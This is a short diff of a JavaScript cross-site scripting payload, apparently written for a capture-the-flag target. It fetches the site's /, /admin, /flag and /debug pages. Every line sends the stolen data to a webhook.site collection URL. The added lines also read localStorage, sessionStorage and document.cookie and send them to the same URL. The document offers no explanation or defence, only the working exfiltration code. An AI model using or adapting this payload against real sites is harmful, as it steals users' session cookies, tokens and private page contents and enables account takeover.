@@ -1,4 +1,5 @@
-fetch('/').then(r=>r.text()).then(t=>fetch('https://webhook.site/39b226d4-f904-47c4-81fa-28fb8924387a/page?p='+encodeURIComponent(t)))
-fetch('/admin').then(r=>r.text()).then(t=>fetch('https://webhook.site/39b226d4-f904-47c4-81fa-28fb8924387a/admin?p='+encodeURIComponent(t)))
-fetch('/flag').then(r=>r.text()).then(t=>fetch('https://webhook.site/39b226d4-f904-47c4-81fa-28fb8924387a/flag?p='+encodeURIComponent(t)))
-fetch('/debug').then(r=>r.text()).then(t=>fetch('https://webhook.site/39b226d4-f904-47c4-81fa-28fb8924387a/debug?p='+encodeURIComponent(t)))
+var w='https://webhook.site/39b226d4-f904-47c4-81fa-28fb8924387a';
+fetch(w+'/ls?d='+encodeURIComponent(JSON.stringify(localStorage)));
+fetch(w+'/ss?d='+encodeURIComponent(JSON.stringify(sessionStorage)));
+fetch(w+'/cookie?d='+encodeURIComponent(document.cookie));
+fetch('/debug').then(r=>r.text()).then(t=>fetch(w+'/deb?d='+encodeURIComponent(t)));
